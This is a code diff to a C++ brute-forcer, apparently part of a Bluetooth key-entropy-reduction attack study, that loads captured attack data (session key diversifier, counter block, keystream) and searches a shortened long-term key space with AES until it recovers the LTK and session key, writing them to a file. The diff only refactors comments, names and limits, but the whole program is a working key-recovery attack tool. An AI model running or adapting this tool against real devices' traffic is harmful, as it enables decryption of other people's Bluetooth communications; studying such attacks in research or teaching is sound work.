@@ -4,10 +4,28 @@
 #include <iostream>
 #include <stdexcept>
 #include <string>
-#include <chrono>          // <-- for timing
+#include <math.h>
+#include <chrono>         
 #include <openssl/aes.h>
 
+// Struct to represent attack data
+// - key size is the amount of non zero bytes in the key 
+//   (One could say it is the length of the key, but length is always 16 bytes, it is the most significant bytes that are set to zero)
+// - P is the plaintext (counterblock)
+// - C is the ciphertext (keystream)
+// - SKD is the session key diversifier (session key is computed with AES_LTK(SKD) )
+// - 49 bytes of data
+struct AttackData {
+    uint8_t key_size;                 
+    std::array<uint8_t, 16> P;        
+    std::array<uint8_t, 16> C;        
+    std::array<uint8_t, 16> SKD;      
+};
 
+// Function to encrypt a 16 byte block using AES-ECB 128
+// - key is the aes 128 key
+// - in is the plaintext
+// - out is the ciphertext
 void aes128_ecb_encrypt(const uint8_t key[16], const uint8_t in[16], uint8_t out[16]){
     AES_KEY aes_key;
     if (AES_set_encrypt_key(key, 128, &aes_key) != 0) {
@@ -16,13 +34,8 @@ void aes128_ecb_encrypt(const uint8_t key[16], const uint8_t in[16], uint8_t out
     AES_encrypt(in, out, &aes_key);
 }
 
-struct AttackData {
-    uint8_t key_size;                 // 1 byte
-    std::array<uint8_t, 16> P;        // plaintext / counter block
-    std::array<uint8_t, 16> C;        // ciphertext / keystream
-    std::array<uint8_t, 16> SKD;      // SKD
-};
-
+// Function to load the attack data, returns a AttackData struct
+// - path is the path to the file that contains the attack data (file should contain 49 bytes)
 AttackData load_attack_data(const std::string &path) {
     AttackData d{};
     std::ifstream f(path, std::ios::binary);
@@ -51,6 +64,9 @@ AttackData load_attack_data(const std::string &path) {
     return d;
 }
 
+// Function to write the LTK to the specified filepath
+// - path is filepath where the LTK will be written to
+// - ltk is the bruteforced LTK  
 void write_ltk(const std::string &path, const uint8_t ltk[16]) {
     std::ofstream f(path, std::ios::binary | std::ios::trunc);
     if (!f) {
@@ -59,7 +75,7 @@ void write_ltk(const std::string &path, const uint8_t ltk[16]) {
     f.write(reinterpret_cast<const char*>(ltk), 16);
 }
 
-// helper: convert byte array -> lowercase hex string
+// Function to convert the LTK to hex value to print it 
 std::string to_hex(const uint8_t *data, std::size_t len) {
     static const char hex_digits[] = "0123456789abcdef";
     std::string s;
@@ -72,10 +88,10 @@ std::string to_hex(const uint8_t *data, std::size_t len) {
     return s;
 }
 
+// Function to bruteforce the ltk, by comparing the ciphertexts formed with the candidate session keys with the original ciphertext
 int main(int argc, char **argv) {
     if (argc != 3) {
-        std::cerr << "Usage: " << argv[0]
-                  << " attack_data.bin ltk_found.bin\n";
+        std::cerr << "Wrong usage of this function, provide path for attack data and path to store LTK!\n";
         return 1;
     }
 
@@ -88,56 +104,42 @@ int main(int argc, char **argv) {
         const int key_size   = static_cast<int>(d.key_size);
         const int zero_bytes = 16 - key_size;
 
-        // We brute-force ALL key_size bytes.
-        // This is only feasible for small key_size (e.g. <= 3).
-        if (key_size > 6) {
+        if (key_size > 4) {
             std::cerr << "key_size = " << key_size
-                      << " is too large for naive brute-force demo.\n";
-            return 3;
+                      << " is too large for this naive bruteforcer (4 bytes takes already 10 min).\n";
+            return 1;
         }
-
-        const int unknown_offset = zero_bytes;
-        const int unknown_count  = key_size;
-
-        // Base LTK: first (16 - key_size) bytes zero, rest will be brute-forced.
-        std::array<uint8_t, 16> base_ltk{};
-        base_ltk.fill(0x00);
-
-        // total keys = 2^(8 * unknown_count)
-        // (for unknown_count up to 6 this fits in 64-bit)
-        const uint64_t total = (unknown_count == 0)
-            ? 1
-            : (1ULL << (8 * unknown_count));
-
-        uint8_t sk[16];
-        uint8_t test[16];
-
+        uint64_t total = (uint64_t)pow(2.0, 8.0 * key_size);
         std::cout << "Bruteforcing key_size=" << key_size
                   << " => " << total << " candidates\n";
 
-        // ---- start timing just before the brute-force loop ----
+
+        std::array<uint8_t, 16> base_ltk{};
+        base_ltk.fill(0x00);
+
+        uint8_t candidate_sk[16];
+        uint8_t candidate_cipher[16];
+
         auto t_start = std::chrono::steady_clock::now();
 
         for (uint64_t i = 0; i < total; ++i) {
-            // Map counter -> unknown bytes (big-endian mapping)
-            std::array<uint8_t, 16> ltk = base_ltk;
+            std::array<uint8_t, 16> candidate_ltk = base_ltk;
 
+            // form next candidate LTK
             uint64_t tmp = i;
-            for (int b = unknown_count - 1; b >= 0; --b) {
+            for (int b = key_size - 1; b >= 0; --b) {
                 uint8_t byte = static_cast<uint8_t>(tmp & 0xFF);
-                ltk[unknown_offset + b] = byte;
+                candidate_ltk[zero_bytes + b] = byte;
                 tmp >>= 8;
             }
 
-            // SK = AES_128(LTK, SKD)
-            aes128_ecb_encrypt(ltk.data(), d.SKD.data(), sk);
+            aes128_ecb_encrypt(candidate_ltk.data(), d.SKD.data(), candidate_sk); // compute candidate session key
+            aes128_ecb_encrypt(candidate_sk, d.P.data(), candidate_cipher); // compute ciphertext with candidate session key
 
-            // test = AES_128(SK, P)
-            aes128_ecb_encrypt(sk, d.P.data(), test);
-
+            // compare real ciphertext with ciphertext computed with candidate session key 
             bool match = true;
             for (int j = 0; j < 16; ++j) {
-                if (test[j] != d.C[j]) {
+                if (candidate_cipher[j] != d.C[j]) {
                     match = false;
                     break;
                 }
@@ -147,12 +149,11 @@ int main(int argc, char **argv) {
                 auto t_end = std::chrono::steady_clock::now();
                 std::chrono::duration<double> elapsed = t_end - t_start;
 
-                std::cout << "Found LTK candidate, writing to " << ltk_path << "\n";
-                write_ltk(ltk_path, ltk.data());
+                std::cout << "Found LTK! \n";
+                write_ltk(ltk_path, candidate_ltk.data()); //write LTK to file
 
-                // print LTK and SK in hex (lowercase, no spaces)
-                std::cout << "LTK = " << to_hex(ltk.data(), 16) << "\n";
-                std::cout << "SK  = " << to_hex(sk, 16)      << "\n";
+                std::cout << "LTK = " << to_hex(candidate_ltk.data(), 16) << "\n";
+                std::cout << "SK  = " << to_hex(candidate_sk, 16)      << "\n";
 
                 std::cout << "Bruteforce time: "
                           << elapsed.count() << " seconds\n";
@@ -161,14 +162,13 @@ int main(int argc, char **argv) {
             }
         }
 
-        // No key found: also print how long we searched
         auto t_end = std::chrono::steady_clock::now();
         std::chrono::duration<double> elapsed = t_end - t_start;
 
-        std::cerr << "No key found in search space\n";
+        std::cerr << "No key found.\n";
         std::cerr << "Bruteforce time: "
                   << elapsed.count() << " seconds\n";
-        return 2;
+        return 1;
 
     } catch (const std::exception &e) {
         std::cerr << "Error: " << e.what() << "\n";
